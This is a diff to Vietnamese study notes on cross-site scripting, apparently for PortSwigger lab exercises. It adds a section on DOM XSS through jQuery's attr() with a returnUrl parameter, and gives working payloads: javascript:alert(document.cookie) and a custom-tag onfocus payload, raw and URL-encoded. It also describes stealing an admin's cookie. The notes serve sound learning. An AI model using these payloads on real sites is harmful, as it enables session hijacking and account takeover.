@@ -87,5 +87,13 @@ http://example.com/#<img src=x onerror=alert(1)>
 ```
 3. Khi admin duyệt bài viết → bị đánh cắp cookie
 4. Attacker đăng nhập với cookie của admin → xóa dữ liệu người dùng
-
----
+## DOM XSS Trong Jquery:
+- Nếu có sử dụng script jquery bạn có thể chú ý đến `attr()` hàm query có tác dụng thay đổi thuộc tính của DOM
+```javascript
+$(function() {
+	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
+});
+```
+ta có thể sử dụng cơ chế window.location.search để thay đổi params truyền vào bằng javascript:alert(document.cookie), ngoài ra còn có $()
+Có thể tận dụng brute để intruder các payload để test
+- Nếu trang chặn hết tất cả thẻ html ta có thể sử dụng thẻ tùy chỉnh `https://YOUR-LAB-ID.web-security-academy.net/?search=<xss+id=x+onfocus=alert(document.cookie) tabindex=1>#x'` và tiến hành encode nó thành `https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'`
